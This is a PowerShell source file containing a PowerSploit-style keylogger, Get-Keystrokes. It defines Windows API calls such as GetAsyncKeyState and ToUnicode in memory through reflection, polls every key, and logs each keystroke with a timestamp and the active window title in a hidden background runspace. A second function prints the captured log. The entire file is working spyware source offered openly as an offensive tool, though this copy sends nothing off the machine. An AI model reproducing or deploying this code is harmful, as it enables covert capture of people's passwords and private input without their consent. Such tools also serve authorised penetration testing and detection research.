function Get-Keystrokes {
<#
.SYNOPSIS
 
    Logs keys pressed, time and the active window.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.PARAMETER PollingInterval

    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.

.PARAMETER RunningTime

    Specifies the time in minutes for how long you want to job to run for. Defaults to 60 minutes.

.EXAMPLE

    Get-Keystrokes -PollingInterval 20 -Runningtime 240

.EXAMPLE

    Get-KeylogOutput

.LINK

    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#>
    [CmdletBinding()] Param (
    [Int32]
    $PollingInterval = 40,
    [Int32]
    $RunningTime = 60
    
    )

    $scriptblock = @"
    function KeyLog {
    `$PollingInterval = $PollingInterval

    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

    try
    {
        `$ImportDll = [User32]
    }
    catch
    {
        `$DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
        `$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(`$DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        `$ModuleBuilder = `$AssemblyBuilder.DefineDynamicModule('Win32Lib', `$False)
        `$TypeBuilder = `$ModuleBuilder.DefineType('User32', 'Public, Class')

        `$DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        `$FieldArray = [Reflection.FieldInfo[]] @(
            [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
            [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
            [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
            [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
        )

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
        `$FieldValueArray = [Object[]] @(
            'GetAsyncKeyState',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
        `$FieldValueArray = [Object[]] @(
            'GetKeyboardState',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
        `$FieldValueArray = [Object[]] @(
            'MapVirtualKey',
            `$False,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
            [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
        `$FieldValueArray = [Object[]] @(
            'ToUnicode',
            `$False,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
        `$FieldValueArray = [Object[]] @(
            'GetForegroundWindow',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$ImportDll = `$TypeBuilder.CreateType()
    }

    Start-Sleep -Milliseconds `$PollingInterval

        try
        {

            #loop through typeable characters to see which is pressed
            for (`$TypeableChar = 1; `$TypeableChar -le 254; `$TypeableChar++)
            {
                `$VirtualKey = `$TypeableChar
                `$KeyResult = `$ImportDll::GetAsyncKeyState(`$VirtualKey)

                #if the key is pressed
                if ((`$KeyResult -band 0x8000) -eq 0x8000)
                {

                    #check for keys not mapped by virtual keyboard
                    `$LeftShift    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    `$RightShift   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    `$LeftCtrl     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    `$RightCtrl    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    `$LeftAlt      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    `$RightAlt     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    `$TabKey       = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    `$SpaceBar     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    `$DeleteKey    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    `$EnterKey     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    `$BackSpaceKey = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    `$LeftArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    `$RightArrow   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    `$UpArrow      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    `$DownArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    `$LeftMouse    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    `$RightMouse   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if (`$LeftShift -or `$RightShift) {`$LogOutput += '[Shift]'}
                    if (`$LeftCtrl  -or `$RightCtrl)  {`$LogOutput += '[Ctrl]'}
                    if (`$LeftAlt   -or `$RightAlt)   {`$LogOutput += '[Alt]'}
                    if (`$TabKey)       {`$LogOutput += '[Tab]'}
                    if (`$SpaceBar)     {`$LogOutput += '[SpaceBar]'}
                    if (`$DeleteKey)    {`$LogOutput += '[Delete]'}
                    if (`$EnterKey)     {`$LogOutput += '[Enter]'}
                    if (`$BackSpaceKey) {`$LogOutput += '[Backspace]'}
                    if (`$LeftArrow)    {`$LogOutput += '[Left Arrow]'}
                    if (`$RightArrow)   {`$LogOutput += '[Right Arrow]'}
                    if (`$UpArrow)      {`$LogOutput += '[Up Arrow]'}
                    if (`$DownArrow)    {`$LogOutput += '[Down Arrow]'}
                    if (`$LeftMouse)    {`$LogOutput += '[Left Mouse]'}
                    if (`$RightMouse)   {`$LogOutput += '[Right Mouse]'}

                    #check for capslock
                    if ([Console]::CapsLock) {`$LogOutput += '[Caps Lock]'}

                    `$MappedKey = `$ImportDll::MapVirtualKey(`$VirtualKey, 3)
                    `$KeyboardState = New-Object Byte[] 256
                    `$CheckKeyboardState = `$ImportDll::GetKeyboardState(`$KeyboardState)

                    #create a stringbuilder object
                    `$StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                    `$UnicodeKey = `$ImportDll::ToUnicode(`$VirtualKey, `$MappedKey, `$KeyboardState, `$StringBuilder, `$StringBuilder.Capacity, 0)

                    #convert typed characters
                    if (`$UnicodeKey -gt 0) {
                        `$TypedCharacter = `$StringBuilder.ToString()
                        `$LogOutput += ('['+ `$TypedCharacter +']')
                    }

                    #get the title of the foreground window
                    `$TopWindow = `$ImportDll::GetForegroundWindow()
                    `$WindowTitle = (Get-Process | Where-Object { `$_.MainWindowHandle -eq `$TopWindow }).MainWindowTitle

                    #get the current DTG
                    `$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)

                    #Create a custom object to store results
                    `$ObjectProperties = @{'Key Typed' = `$LogOutput;
                                            'Time' = `$TimeStamp;
                                            'Window Title' = `$WindowTitle}
                    `$ResultsObject = New-Object -TypeName PSObject -Property `$ObjectProperties

                    # Stupid hack since Export-CSV doesn't have an append switch in PSv2
                    `$CSVEntry = (`$ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
                    `$klsessionstate.log += `$CSVEntry
                   
                }
            }
        }
        catch {}
    }

`$timeout = new-timespan -Minutes $RunningTime
`$sw = [diagnostics.stopwatch]::StartNew()
while (`$sw.elapsed -lt `$timeout){Keylog}

"@

$global:klsessionstate = "2"
$PollingInterval = 40

$global:klsessionstate = [HashTable]::Synchronized(@{})
$klsessionstate.log = New-Object System.Collections.ArrayList

$HTTP_runspace = [RunspaceFactory]::CreateRunspace()
$HTTP_runspace.Open()
$HTTP_runspace.SessionStateProxy.SetVariable('klsessionstate',$klsessionstate)
$HTTP_powershell = [PowerShell]::Create()
$HTTP_powershell.Runspace = $HTTP_runspace
$HTTP_powershell.AddScript($scriptblock) > $null
$HTTP_powershell.BeginInvoke() > $null

echo ""
echo "[+] Started Keylogging for $RunningTime minutes"
echo ""
echo "Run Get-KeystrokeData to obtain the keylog output"
echo ""
}

function Get-KeystrokeData {
    echo ""
    "[+] Keylog data:"
    echo $klsessionstate.log
}
